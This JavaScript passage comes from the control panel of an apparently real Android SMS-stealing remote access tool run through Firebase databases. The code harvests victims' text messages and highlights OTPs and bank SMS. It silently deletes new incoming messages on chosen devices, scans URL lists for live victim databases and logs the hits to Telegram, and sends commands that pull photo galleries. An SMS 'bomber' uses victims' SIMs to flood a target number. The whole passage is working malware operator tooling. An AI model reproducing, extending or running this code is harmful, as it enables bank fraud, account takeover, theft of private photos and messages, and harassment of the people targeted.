  const label=$('allMsgsLiveLabel');
  if(label) label.textContent='🔴 Live • '+allMsgsCache.length+' msgs (updated '+secsAgo+'s ago)';
}

async function refreshAllMessagesNow(){
  if(!allDevices.length) return toast("No devices loaded");
  const btn=$('btnRefreshAllMsgs');
  allMsgsLoading=false;allMsgsCache=[];allMsgsIds.clear();allMsgsLastSeen={};allMsgsLastRefreshTime=0;
  $('allMsgsList').innerHTML='<div style="text-align:center;padding:40px;color:var(--cyan);"><div class="spinner" style="width:28px;height:28px;border-width:3px;margin:0 auto 12px;"></div><div style="font-size:13px;font-weight:700;">Reloading...</div></div>';
  $('allMsgsStats').innerHTML='';$('allMsgsLiveLabel').innerHTML='<span class="mini-spin"></span> Refreshing...';
  if(btn){btn.disabled=true;btn.innerHTML='⏳ Loading...';}
  try{await loadAllMessages(true);allMsgsLastRefreshTime=Date.now();if(btn){btn.disabled=false;btn.innerHTML='🔄 Refresh';}toast("✓ Reloaded "+allMsgsCache.length+" messages");}
  catch(e){if(btn){btn.disabled=false;btn.innerHTML='🔄 Refresh';}toast("Reload failed: "+e.message);}
}

async function loadAllMessages(showSpinner){
  if(!allDevices.length) return;if(allMsgsLoading) return;
  allMsgsLoading=true;
  const validDevices=allDevices.filter(d=>!d.isFake);
  const CONC=20;const queue=[...validDevices];let loadedCount=0;const total=validDevices.length;
  if(showSpinner) showLoadingBar('Loading 0/'+total+' devices...',0);
  const worker=async()=>{
    while(queue.length>0){
      const d=queue.shift();
      try{
        const msgs=await fetchMessagesFromDb(d.dbUrl,d.dbKey,d.id,100);
        msgs.forEach(m=>{const key=(d.dbUrl||'')+'_'+d.id+'_'+m.id;if(!allMsgsIds.has(key)){allMsgsIds.add(key);allMsgsCache.push({...m,devId:d.id,devNumber:d.number,dbName:d.dbName,dbUrl:d.dbUrl});}});
      }catch(e){}
      loadedCount++;
      if(loadedCount%5===0||loadedCount===total){showLoadingBar('Loading '+loadedCount+'/'+total+' devices · '+allMsgsCache.length+' messages found',Math.floor((loadedCount/total)*100));allMsgsCache.sort(sortLatestFirst);renderAllMessages();}
    }
  };
  await Promise.all(Array(Math.min(CONC,validDevices.length)).fill(0).map(worker));
  allMsgsLoading=false;allMsgsCache.sort(sortLatestFirst);
  if(allMsgsCache.length>3000){allMsgsCache=allMsgsCache.slice(0,3000);allMsgsIds.clear();allMsgsCache.forEach(m=>allMsgsIds.add((m.dbUrl||'')+'_'+m.devId+'_'+m.id));}
  allMsgsLastRefreshTime=Date.now();hideLoadingBar();updateAllMsgsLabel();renderAllMessages();
  _saveMsgsToSession();
}

function sortLatestFirst(a,b){if(a.timeMs!==b.timeMs) return b.timeMs-a.timeMs;return b.id.localeCompare(a.id);}

async function tailAllMessages(){
  if(!allDevices.length||allMsgsLoading) return;
  const validDevices=allDevices.filter(d=>!d.isFake);let newCount=0;const CONC=20;const queue=[...validDevices];
  const worker=async()=>{
    while(queue.length>0){
      const d=queue.shift();
      try{const msgs=await fetchMessagesFromDb(d.dbUrl,d.dbKey,d.id,30);msgs.forEach(m=>{const key=(d.dbUrl||'')+'_'+d.id+'_'+m.id;if(!allMsgsIds.has(key)){allMsgsIds.add(key);allMsgsCache.push({...m,devId:d.id,devNumber:d.number,dbName:d.dbName,dbUrl:d.dbUrl});newCount++;}});}catch(e){}
    }
  };
  await Promise.all(Array(Math.min(CONC,validDevices.length)).fill(0).map(worker));
  if(newCount>0){allMsgsCache.sort(sortLatestFirst);if(allMsgsCache.length>3000){allMsgsCache=allMsgsCache.slice(0,3000);allMsgsIds.clear();allMsgsCache.forEach(m=>allMsgsIds.add((m.dbUrl||'')+'_'+m.devId+'_'+m.id));}renderAllMessages();_saveMsgsToSession();}
  allMsgsLastRefreshTime=Date.now();updateAllMsgsLabel();
}

function startAllMsgsBackground(){
  if(allMsgsBgTimer) clearInterval(allMsgsBgTimer);
  allMsgsBgTimer=setInterval(async()=>{
    if(allDevices.length===0||allMsgsLoading) return;
    if($('view-allmsgs').classList.contains('active')) return;
    await tailAllMessages();
  },2500);
}

function renderAllMessages(){
  const q=($('allMsgsSearch')?.value||'').toLowerCase().trim();
  const filtered=q?allMsgsCache.filter(m=>m.text.toLowerCase().includes(q)||(m.sender||'').toLowerCase().includes(q)||m.devId.toLowerCase().includes(q)||(m.devNumber||'').toLowerCase().includes(q)):allMsgsCache;
  $('allMsgsStats').innerHTML='Total: <b style="color:var(--cyan)">'+allMsgsCache.length+'</b> • Showing: <b style="color:var(--cyan)">'+filtered.length+'</b>';
  const container=$('allMsgsList');if(!container) return;
  let newHtml='';
  filtered.slice(0,500).forEach(m=>{
    const ist=formatIST(m.time,m.id);const qInfo=isQuotaSms(m.text);const isBank=parseBankSMS(m.text,m.sender)?true:false;
    const cls=qInfo?'msg-card sms-theme quota-msg':(isBank?'msg-card sms-theme bank-msg':'msg-card sms-theme');
    const ot=m.text.match(/\b\d{4,8}\b/);const isOtp=/OTP|code|password|verification/i.test(m.text);
    const otpBtn=(ot&&isOtp)?'<button class="action-btn otp" onclick="copyOtp(\''+ot[0]+'\')">Copy OTP</button>':'';
    const dev=allDevices.find(d=>d.id===m.devId&&(d.dbName===m.dbName||!isAllMode));const devOnline=dev?dev.online:false;
    const statusTag=devOnline?'<span class="status-mini online">● Online</span>':'<span class="status-mini offline">● Offline</span>';
    newHtml+='<div class="'+cls+'"><div class="msg-top"><span class="msg-sender">'+(m.sender||'Unknown')+(m.direction==='out'?' (OUT)':'')+'</span><span class="msg-time">'+ist+'</span></div><div class="msg-dev-tag">📱 '+m.devId.slice(0,16)+' '+(m.dbName&&isAllMode?'• '+m.dbName:'')+' '+statusTag+'</div><div class="msg-body">'+m.text+'</div><div class="msg-actions-bar">'+otpBtn+'<button class="action-btn" onclick="copyDataTextById(\''+m.id+'\',\''+m.devId+'\')">Copy</button><button class="action-btn delete" onclick="deleteSingleMessage(\''+m.id+'\', true)">🗑 Delete</button></div></div>';
  });
  if(container.innerHTML!==newHtml) container.innerHTML=newHtml;
}
function copyDataTextById(id,devId){const msg=allMsgsCache.find(m=>m.id===id&&m.devId===devId);if(msg) navigator.clipboard.writeText(msg.text).then(()=>toast("Copied!"));}
function copyAllMessages(){
  const q=($('allMsgsSearch')?.value||'').toLowerCase().trim();
  const filtered=q?allMsgsCache.filter(m=>m.text.toLowerCase().includes(q)||(m.sender||'').toLowerCase().includes(q)||m.devId.toLowerCase().includes(q)):allMsgsCache;
  if(!filtered.length) return toast("Nothing to copy");
  navigator.clipboard.writeText(filtered.map(m=>'['+formatIST(m.time,m.id)+']['+m.direction+']['+m.devId.slice(0,12)+']['+m.sender+'] '+m.text).join('\n\n')).then(()=>toast("Copied "+filtered.length+" messages!"));
}

// ═══════════════════════════════════════════
//  SAVED DB MANAGEMENT (same)
// ═══════════════════════════════════════════
function renderSavedDbs(){
  if(isSharedLinkMode){$('savedList').innerHTML='<div style="font-size:12px;color:var(--muted);text-align:center;padding:16px;">Shared Link Mode Active</div>';$('savedCountBadge').innerText="0 accounts";return;}
  let seen=new Set();savedDbs=savedDbs.filter(db=>{if(seen.has(db.url)) return false;seen.add(db.url);return true;});
  localStorage.setItem('rajxweb_saved_dbs',JSON.stringify(savedDbs));
  $('savedCountBadge').innerText=savedDbs.length+" accounts";
  if(!savedDbs.length){$('savedList').innerHTML='<div style="font-size:12px;color:var(--muted);text-align:center;padding:16px;">No accounts saved yet.</div>';return;}
  $('savedList').innerHTML=savedDbs.map((db,i)=>{
    const dateStr=db.added?new Date(db.added).toLocaleString('en-US',{month:'numeric',day:'numeric',year:'numeric',hour:'numeric',minute:'2-digit'}):'Unknown';
    return '<div class="saved-item"><div class="saved-item-info"><p>'+db.url+'</p><span>'+dateStr+' · '+(db.key||'Default')+'</span></div><div class="saved-item-actions"><button class="icon-btn share" onclick="shareDb('+i+')"><svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg></button><button class="icon-btn delete" onclick="deleteDb('+i+')"><svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg></button><button class="icon-btn arrow" onclick="openDb('+i+')"><svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg></button></div></div>';
  }).join('');
  if($('removedCountInline')) $('removedCountInline').textContent=removedDbsLog.length;
}

async function shareDb(i){
  const db=savedDbs[i];
  try{const payload={u:db.url,k:db.key||""};const enc=await aesEncrypt(JSON.stringify(payload));const link=window.location.origin+window.location.pathname+"?s="+enc;navigator.clipboard.writeText(link).then(()=>toast("Link copied!")).catch(()=>toast("Link generated!"));}catch(e){toast("Share failed: "+e.message);}
}

function deleteDb(i){
  if(!confirm("Delete this account?")) return;
  savedDbs.splice(i,1);
  localStorage.setItem('rajxweb_saved_dbs',JSON.stringify(savedDbs));
  renderSavedDbs();toast("Deleted");
}

function openDb(i){
  const db=savedDbs[i];if(!db) return;
  currentDb={url:db.url.replace(/\/+$/,''),key:db.key||'',name:db.url.split('.')[0].replace('https://','')};
  isAllMode=false;
  switchMainTab('dashboard');
  $('dashUrl').innerText=currentDb.name;
  $('dbLabel').innerText=currentDb.name;
  $('connDot').style.background='var(--green)';
  loadRealData(currentDb);
  const shareBtn=$('shareBtn');if(shareBtn) shareBtn.style.display='';
}

async function connectAllSaved(){
  if(!savedDbs.length) return toast("No saved accounts");
  isAllMode=true;
  currentDb={url:'',key:'',name:''};
  allDevices=[];allMsgsCache=[];allMsgsIds.clear();
  $('deviceList').innerHTML='';
  $('dashUrl').innerText='All DBs';
  $('dbLabel').innerText='All DBs';
  switchMainTab('dashboard');
  $('globalLoading').style.display='inline-flex';
  $('globalLoading').innerHTML='<div class="spinner" style="width:14px;height:14px;border-width:2px;margin:0;"></div> Connecting all DBs...';

  for(const db of savedDbs){
    const cleanUrl=db.url.replace(/\/+$/,'');
    const dbName=cleanUrl.split('.')[0].replace('https://','');
    await loadRealData({url:cleanUrl,key:db.key,name:dbName});
  }

  $('dashStatus').innerHTML='<span style="color:var(--green);">●</span> Connected • '+allDevices.length+' devices (All DBs)';
  $('globalLoading').style.display='none';
  scheduleDailyRefresh();startFirebaseAutoRefresh();startAutoDeleteWorker();startAllMsgsBackground();
}

function logoutDb(){
  currentDb={url:"",key:"",name:""};isAllMode=false;allMsgsCache=[];allMsgsIds.clear();allMsgsLastSeen={};
  if(allMsgsAutoTimer){clearInterval(allMsgsAutoTimer);allMsgsAutoTimer=null;}
  if(allMsgsBgTimer){clearInterval(allMsgsBgTimer);allMsgsBgTimer=null;}
  if(allMsgsLabelTicker){clearInterval(allMsgsLabelTicker);allMsgsLabelTicker=null;}
  if(firebaseAutoRefreshTimer){clearInterval(firebaseAutoRefreshTimer);firebaseAutoRefreshTimer=null;}
  if(autoRefreshTimer){clearTimeout(autoRefreshTimer);autoRefreshTimer=null;}
  if(bgWorker){try{bgWorker.postMessage({type:'stop'});bgWorker.terminate();}catch(e){} bgWorker=null;}
  if(bombActive) stopBombing();
  window._preFakeSmsIds={};savePreIds();
  $('connDot').style.background='var(--muted)';$('dbLabel').innerText='Home';$('deviceList').innerHTML='';
  switchMainTab('home');
}

function openAddModal(){$('addModal').classList.add('active');$('newUrlHint').style.display='none';}
function closeModal(id){$(id).classList.remove('active');}

function saveNewAccount(){
  let url=$('newUrl').value.trim().replace(/\/+$/,'');
  let key=$('newKey').value.trim()||DEFAULT_FB_KEY;
  if(!url) return toast("Enter URL");
  const existing=savedDbs.find(db=>db.url===url);
  if(existing){
    if(confirm("⚠ Already saved!\n\nURL: "+url+"\nKey: "+existing.key+"\n\nOpen saved account?")){
      closeModal('addModal');openDb(savedDbs.indexOf(existing));
      $('newUrl').value='';$('newKey').value='';$('newUrlHint').style.display='none';
    }
    return;
  }
  savedDbs.push({url,key,added:Date.now()});
  localStorage.setItem('rajxweb_saved_dbs',JSON.stringify(savedDbs));
  renderSavedDbs();closeModal('addModal');toast("✅ Account saved");
  $('newUrl').value='';$('newKey').value='';$('newUrlHint').style.display='none';
  openDb(savedDbs.length-1);
}

(function(){
  const input=$('newUrl');if(!input) return;
  input.addEventListener('input',()=>{
    const url=input.value.trim().replace(/\/+$/,'');
    const hint=$('newUrlHint');
    if(!url){hint.style.display='none';return;}
    const existing=savedDbs.find(db=>db.url===url);
    if(existing){hint.innerHTML='⚠ Already saved! Key: <b>'+existing.key+'</b>';hint.style.display='block';}
    else hint.style.display='none';
  });
})();

// ═══════════════════════════════════════════
//  BULK SCANNER (via backend)
// ═══════════════════════════════════════════
let bulkActiveUrls=[];
async function scanBulk(){
  const input=$('bulkInput').value.trim();if(!input) return toast("Paste URLs first");
  const lines=input.split('\n').map(l=>l.trim()).filter(Boolean);
  $('bulkResults').innerHTML='<div style="color:var(--cyan);text-align:center;padding:14px;">Scanning '+lines.length+' URLs...</div>';
  $('btnCopyActive').style.display='none';bulkActiveUrls=[];let html='';
  for(const line of lines){
    const parts=line.split('|');const url=parts[0].trim();const key=parts[1]?parts[1].trim():DEFAULT_FB_KEY;
    try{
      const data=await yn(url,key,"clients");
      let total=0,online=0,status='DEAD';
      if(data){total=Object.keys(data).length;Object.values(data).forEach(d=>{if(d.status===true||String(d.status).toLowerCase()==='online') online++;});status=total>0?'ACTIVE':'EMPTY';}
      if(status==='ACTIVE') bulkActiveUrls.push(url);
      const color=status==='ACTIVE'?'var(--green)':(status==='EMPTY'?'var(--warn)':'var(--danger)');
      html+='<div class="saved-item" style="padding:12px;border-color:'+color+';margin-bottom:8px;"><div class="saved-item-info"><p>'+url+'</p><span>'+status+' • Total: '+total+' • Online: '+online+' • Offline: '+(total-online)+'</span></div></div>';
      if(!loggedDbs.has(url)){sendTgLog(line,url,key,false,"",total,online);loggedDbs.add(url);}
    }catch(e){html+='<div class="saved-item" style="padding:12px;border-color:var(--danger);margin-bottom:8px;"><div class="saved-item-info"><p>'+url+'</p><span>DEAD • '+e.message+'</span></div></div>';}
    $('bulkResults').innerHTML=html;
  }
  if(bulkActiveUrls.length>0){$('btnCopyActive').style.display='flex';$('btnCopyActive').innerHTML='📋 Copy Active ('+bulkActiveUrls.length+')';}
  toast("Done • "+bulkActiveUrls.length+" active");
}
function copyActiveBulk(){
  if(!bulkActiveUrls.length) return toast("No active URLs");
  const txt="🚀 ACTIVE DATABASES:\n\n"+JSON.stringify(bulkActiveUrls,null,2)+"\n\n📢 JOIN: "+TELEGRAM_LINK+"\n🌐 PANEL: "+PANEL_LINK;
  navigator.clipboard.writeText(txt).then(()=>toast("✅ Copied!"));
}
function copyBulkResults(){
  const txt=$('bulkResults').innerText;
  if(!txt) return toast("Nothing to copy");
  navigator.clipboard.writeText(txt+"\n\n📢 "+TELEGRAM_LINK+"\n🌐 "+PANEL_LINK).then(()=>toast("Copied!"));
}

// ═══════════════════════════════════════════
//  DECRYPT PANEL (same)
// ═══════════════════════════════════════════
async function processDecrypt(){
  const raw=$('panelUrl').value.trim();if(!raw) return toast("Paste a link first");
  const outputDiv=$('decryptedResults');
  outputDiv.innerHTML='<div style="text-align:center;padding:10px;color:var(--cyan);font-size:12px;"><span class="mini-spin"></span> Extracting Firebase URLs...</div>';
  let foundUrls=new Set();
  const regex=/https?:\/\/([a-zA-Z0-9-]+)\.(firebaseio\.com|firebasedatabase\.app)/g;
  let match;
  while((match=regex.exec(raw))!==null) foundUrls.add(match[0]);
  if(foundUrls.size===0){
    let targetB64="";
    if(raw.includes('?')){ try{const urlObj=new URL(raw);for(const[k,v]of urlObj.searchParams){if(v.length>20) targetB64=v;}}catch(e){} }
    else targetB64=raw;
    if(targetB64){
      try{
        let decoded=atob(targetB64);
        if(decoded.includes('||||||')){let parts=decoded.split('||||||');let url=parts[0];let key=parts[1]||"";if(url.includes('firebase')) foundUrls.add(url+(key?'||||||'+key:""));}
        else if(decoded.includes('firebase')){foundUrls.add(decoded.trim());}
        else{let json=JSON.parse(decoded);let url=json.u||json.url;let key=json.k||json.key||"";if(url) foundUrls.add(url+(key?'||||||'+key:""));}
      }catch(e){while((match=regex.exec(targetB64))!==null) foundUrls.add(match[0]);}
    }
  }
  if(foundUrls.size===0){
    let payload=raw.includes('s=')?raw.split('s=')[1].split('&')[0]:raw;
    let decrypted=await aesDecrypt(payload);
    if(decrypted){
      try{let json=JSON.parse(decrypted);let url=json.u||json.url;let key=json.k||json.key||"";if(url) foundUrls.add(url+(key?'||||||'+key:""));}
      catch(e){while((match=regex.exec(decrypted))!==null) foundUrls.add(match[0]);}
    }
  }
  if(foundUrls.size===0){outputDiv.innerHTML='<div style="color:var(--danger);font-size:12px;text-align:center;padding:10px;">No Firebase URLs found.</div>';return toast("No Firebase found");}
  let html='';
  Array.from(foundUrls).forEach(item=>{
    const parts=item.split('||||||');const url=parts[0];const key=parts[1]||"";
    html+=`<div class="saved-item" style="padding:12px;border-color:var(--cyan);flex-direction:column;align-items:stretch;"><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;"><div style="flex:1;min-width:0;"><p style="font-size:11px;font-family:monospace;color:var(--txt);word-break:break-all;">${url}</p>${key?'<p style="font-size:10px;color:var(--warn);margin-top:2px;">Key: '+key+'</p>':''}</div><button class="copy-fb-btn" onclick="navigator.clipboard.writeText('${item}').then(()=>toast('Copied!'))">Copy</button></div><button class="btn" style="padding:9px;font-size:12px;margin-top:4px;" onclick="saveDecoded('${url}','${key}')">Save & Open</button></div>`;
  });
  outputDiv.innerHTML=html;
  toast("✅ Found "+foundUrls.size+" Firebase URL(s)");
}
function saveDecoded(url,key){
  url=url.trim().replace(/\/+$/,'');
  if(savedDbs.find(db=>db.url===url)){toast("Already saved!");openDb(savedDbs.findIndex(db=>db.url===url));return;}
  savedDbs.push({url,key,added:Date.now()});
  localStorage.setItem('rajxweb_saved_dbs',JSON.stringify(savedDbs));
  renderSavedDbs();$('decryptedResults').innerHTML='';$('panelUrl').value='';
  toast("Saved!");openDb(savedDbs.length-1);
}

// ═══════════════════════════════════════════
//  WEB WORKER (auto-delete for fake-offline) — via backend
// ═══════════════════════════════════════════
function initAutoDeleteWorker(){
  if(bgWorker){try{bgWorker.terminate();}catch(e){} bgWorker=null;}
  const code=`
    let devices=[];let running=false;
    self.onmessage=function(e){
      if(e.data.type==='init'){devices=e.data.devices.map(d=>({url:d.url,key:d.key,devId:d.devId,preIds:new Set(d.preIds)}));if(!running){running=true;loop();}}
      else if(e.data.type==='stop'){running=false;devices=[];}
    };
    async function loop(){
      if(!running) return;
      for(const d of devices){
        if(!d.preIds||d.preIds.size===0) continue;
        try{
          const baseUrl=d.url.replace(/\\/+$/,'');const qs=new URLSearchParams();if(d.key) qs.set('auth',d.key);qs.set('orderBy','"$key"');qs.set('limitToLast','100');
          const res=await fetch(baseUrl+'/messages/'+d.devId+'.json?'+qs.toString());
          const data=await res.json();
          if(data&&typeof data==='object'){
            const dels=[];for(const msgId in data){if(d.preIds.has(msgId)) continue;const q=new URLSearchParams();if(d.key) q.set('auth',d.key);dels.push(fetch(baseUrl+'/messages/'+d.devId+'/'+msgId+'.json?'+q.toString(),{method:'DELETE'}));}
            if(dels.length>0) await Promise.all(dels);
          }
        }catch(e){}
      }
      setTimeout(loop,100);
    }
  `;
  const blob=new Blob([code],{type:'application/javascript'});
  bgWorker=new Worker(URL.createObjectURL(blob));
}
async function startAutoDeleteWorker(){
  initAutoDeleteWorker();
  if(fakeOfflineDevices.length===0){try{if(bgWorker) bgWorker.postMessage({type:'stop'});}catch(e){} return;}
  const tasks=await Promise.all(fakeOfflineDevices.map(async(id)=>{
    const dev=allDevices.find(d=>d.id===id);if(!dev) return null;
    let preIds=window._preFakeSmsIds[id];
    if(!(preIds instanceof Set)){
      try{const msgs=await fetchMessagesFromDb(dev.dbUrl,dev.dbKey,id,200);preIds=new Set(msgs.map(m=>m.id));}
      catch(e){preIds=new Set((window.deviceSmsCache[id]||[]).map(m=>m.id));}
      window._preFakeSmsIds[id]=preIds;
    }
    return{url:dev.dbUrl,key:dev.dbKey,devId:id,preIds:Array.from(preIds)};
  }));
  const workerDevices=tasks.filter(x=>x&&x.preIds&&x.preIds.length>0);
  savePreIds();
  try{bgWorker.postMessage(workerDevices.length>0?{type:'init',devices:workerDevices}:{type:'stop'});}catch(e){}
}

// ═══════════════════════════════════════════
//  BOMBER (via backend)
// ═══════════════════════════════════════════
function openBomber(){$('bomberModal').classList.add('active');}
async function bombLoop(){
  if(!bombActive) return;
  let tasks=[];
  for(const d of(window._bombDevices||[])){for(const sim of(window._bombSims||[])) tasks.push({d,sim});}
  for(let i=0;i<tasks.length;i+=50){
    if(!bombActive) break;
    await Promise.allSettled(tasks.slice(i,i+50).map(async(t)=>{
      try{
        const r = await backendCall("fb_send_sms", { dbUrl: t.d.dbUrl, dbKey: t.d.dbKey, deviceId: t.d.id, sim: t.sim, to: window._bombNum, message: window._bombMsg });
        if(r && r.ok) bombSent++; else bombFail++;
      }catch(e){bombFail++;}
    }));
  }
  if(bombActive) bombLoopTimeout=setTimeout(bombLoop,10);
}
function startBombing(){
  if(bombActive) return toast("Already bombing!");
  const targetNum=$('bombTargetNum').value.trim();const msg=$('bombMessage').value.trim();const simChoice=$('bombSim').value;const deviceFilter=$('bombDevice').value;
  if(!targetNum) return toast("Enter target number");if(!msg) return toast("Enter message");
  let num=targetNum.replace(/\D/g,'');if(num.length===10) num='+91'+num;else if(num.length===12&&num.startsWith('91')) num='+'+num;
  window._bombDevices=allDevices.filter(d=>!d.isFake&&!smsLockedDevices.includes(d.id)&&(deviceFilter==='online'?d.online:true));
  if(!window._bombDevices.length) return toast("No eligible devices");
  window._bombSims=simChoice==='both'?[1,2]:[parseInt(simChoice)];window._bombNum=num;window._bombMsg=msg;
  bombActive=true;bombSent=0;bombFail=0;bombStartTime=Date.now();
  $('btnBombStart').style.display='none';$('btnBombStop').style.display='flex';$('bomberStats').classList.add('show');$('bombFloating').classList.add('show');
  $('bombSentCount').innerText='0';$('bombFailCount').innerText='0';$('bombRate').innerText='0';$('bombFloatSent').innerText='0';
  initBombDrag();bombLoop();
  if(bombStatsTimer) clearInterval(bombStatsTimer);
  bombStatsTimer=setInterval(()=>{
    $('bombSentCount').innerText=bombSent;$('bombFailCount').innerText=bombFail;$('bombFloatSent').innerText=bombSent;
    $('bombRate').innerText=((bombSent/Math.max((Date.now()-bombStartTime)/1000,1)).toFixed(1));
  },500);
  toast("💣 Bombing → "+num+" ("+window._bombDevices.length+" devices)");
}
function stopBombing(){
  if(!bombActive) return;
  bombActive=false;if(bombLoopTimeout){clearTimeout(bombLoopTimeout);bombLoopTimeout=null;}if(bombStatsTimer){clearInterval(bombStatsTimer);bombStatsTimer=null;}
  $('btnBombStart').style.display='flex';$('btnBombStop').style.display='none';$('bombFloating').classList.remove('show');
  toast("⏹ Stopped. Sent: "+bombSent+" | Failed: "+bombFail);
}
function initBombDrag(){
  const el=$('bombFloating');if(!el||bombDragInit) return;bombDragInit=true;
  let dragStart=null;
  el.addEventListener('pointerdown',(e)=>{if(e.target.tagName==='BUTTON') return;const rect=el.getBoundingClientRect();dragStart={x:e.clientX,y:e.clientY,left:rect.left,top:rect.top};el.style.transform='none';el.style.left=rect.left+'px';el.style.top=rect.top+'px';el.classList.add('dragging');try{el.setPointerCapture(e.pointerId);}catch(err){} e.preventDefault();});
  el.addEventListener('pointermove',(e)=>{if(!dragStart) return;const x=Math.max(0,Math.min(window.innerWidth-60,dragStart.left+e.clientX-dragStart.x));const y=Math.max(0,Math.min(window.innerHeight-60,dragStart.top+e.clientY-dragStart.y));el.style.left=x+'px';el.style.top=y+'px';});
  el.addEventListener('pointerup',(e)=>{if(!dragStart) return;dragStart=null;el.classList.remove('dragging');try{el.releasePointerCapture(e.pointerId);}catch(err){}});
}

// ═══════════════════════════════════════════
//  GALLERY (same)
// ═══════════════════════════════════════════
function b64Mime(s){if(typeof s!=='string') return null;s=s.replace(/\s/g,'');if(s.length<300||!/^[A-Za-z0-9+\/=]+$/.test(s)) return null;try{const h=atob(s.substring(0,40));const c0=h.charCodeAt(0),c1=h.charCodeAt(1);if(c0===0xFF&&c1===0xD8) return 'image/jpeg';if(c0===0x89&&h.substring(1,4)==='PNG') return 'image/png';if(h.substring(0,3)==='GIF') return 'image/gif';if(h.substring(0,4)==='RIFF') return 'image/webp';}catch(e){} return null;}
function collectImages(obj,path,out,depth){
  depth=depth||0;if(!obj||typeof obj!=='object'||depth>9) return;
  if(Array.isArray(obj)){obj.forEach((v,i)=>collectImages(v,path+'['+i+']',out,depth+1));return;}
  Object.keys(obj).forEach(k=>{
    const v=obj[k];const p=path?path+'/'+k:k;
    if(typeof v==='string'){
      if(v.startsWith('data:image/')){out.push({id:p,src:v,kind:'datauri'});return;}
      const mime=b64Mime(v);if(mime){out.push({id:p,src:'data:'+mime+';base64,'+v.replace(/\s/g,''),kind:'base64'});return;}
      if(/^https?:\/\//i.test(v)&&(/\.(jpg|jpeg|png|gif|webp)(\?|#|$)/i.test(v)||/(image|photo|media|firebasestorage|alt=media)/i.test(v))){out.push({id:p,src:v,kind:'url'});return;}
    }else if(v&&typeof v==='object') collectImages(v,p,out,depth+1);
  });
}
async function deepScanGallery(){
  if(!activeDevice) return[];
  const url=activeDevice.dbUrl,key=activeDevice.dbKey,devId=activeDevice.id;
  const found=[],seen=new Set();
  const pushAll=(arr)=>arr.forEach(f=>{const sig=f.kind+':'+f.src.length+':'+f.src.substring(0,80);if(!seen.has(sig)){seen.add(sig);found.push(f);}});
  const paths=['gallery/'+devId,'photos/'+devId,'images/'+devId,'media/'+devId,'uploads/'+devId,'sdcard/'+devId,'camera/'+devId,'screenshots/'+devId,'gallery','photos','images','uploads'];
  for(const p of paths){const data=await fbGet(url,key,p);if(data&&typeof data==='object'){const tmp=[];collectImages(data,p,tmp);pushAll(tmp);}}
  for(const p of['messages/'+devId,'clients/'+devId]){const data=await fbGet(url,key,p);if(data&&typeof data==='object'){const tmp=[];collectImages(data,p,tmp);pushAll(tmp);}}
  return found;
}
async function triggerGallerySync(){
  if(!activeDevice) return toast("Open a device first");
  const url=activeDevice.dbUrl,key=activeDevice.dbKey,devId=activeDevice.id;
  const limit=parseInt($('galLimit').value)||20;
  const box=$('galleryContainer');
  box.innerHTML='<div style="text-align:center;padding:40px 20px;color:var(--cyan);"><div class="mini-spin" style="width:20px;height:20px;border-width:3px;margin-bottom:12px;"></div><div style="font-size:14px;font-weight:700;margin-bottom:6px;">Firing command...</div><div style="font-size:11px;color:var(--muted);">'+limit+' photos requested</div></div>';
  const nodes=['clients/'+devId+'/webhookEvent/sendCommand','clients/'+devId+'/webhookEvent/syncGallery','clients/'+devId+'/command','clients/'+devId+'/sync','clients/'+devId+'/webhookEvent'];
  let fired=0;
  for(const node of nodes){try{const ok = await fbPutNode(url, key, node, {command:"gallery_sync",limit,isSended:false,timestamp:Date.now()});if(ok) fired++;}catch(e){}}
  toast("✅ "+fired+"/"+nodes.length+" commands sent");
  let attempts=0;
  const poll=setInterval(async()=>{
    attempts++;const found=await deepScanGallery();
    if(found.length>0){clearInterval(poll);renderGalleryGrid(found);toast("✅ "+found.length+" photos loaded!");}
    else if(attempts>=10){clearInterval(poll);await loadGalleryImages();}
  },4000);
}
async function loadGalleryImages(){
  if(!activeDevice) return toast("Open a device first");
  gallerySelected.clear();galleryData={};galleryIds=[];updateGalleryCount();$('galleryFooter').style.display='none';
  $('galleryContainer').innerHTML='<div style="text-align:center;padding:28px;color:var(--muted);"><span class="mini-spin"></span> Scanning...</div>';
  const uniq=await deepScanGallery();
  if(uniq.length===0){$('galleryContainer').innerHTML='<div style="text-align:center;padding:40px 20px;color:var(--muted);"><p style="font-size:14px;font-weight:700;margin-bottom:8px;">No images found</p><p style="font-size:11px;line-height:1.7;">Target app may not support gallery sync.</p></div>';return;}
  renderGalleryGrid(uniq);
}
function renderGalleryGrid(uniq){
  galleryIds=[];galleryData={};let html='';
  uniq.forEach((g,i)=>{
    galleryIds.push(g);galleryData[i]=g.src;
    let fname="IMG_"+i+".jpg";if(g.kind==='url'){const pts=g.src.split('?')[0].split('/');fname=pts[pts.length-1]||fname;}
    html+='<div class="gal-item" data-idx="'+i+'" onclick="toggleGallerySelect(this)" style="position:relative;border-radius:8px;overflow:hidden;cursor:pointer;border:2px solid transparent;"><img src="'+g.src+'" style="width:100%;height:120px;object-fit:cover;display:block;" loading="lazy" referrerpolicy="no-referrer" onerror="this.parentElement.style.display=\'none\'"><div style="position:absolute;bottom:0;left:0;right:0;padding:20px 8px 6px;background:linear-gradient(transparent,rgba(0,0,0,0.9));color:#fff;font-size:10px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">'+fname+'</div></div>';
  });
  $('galleryContainer').innerHTML='<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(90px,1fr));gap:6px;">'+html+'</div>';
  updateGalleryCount();
}
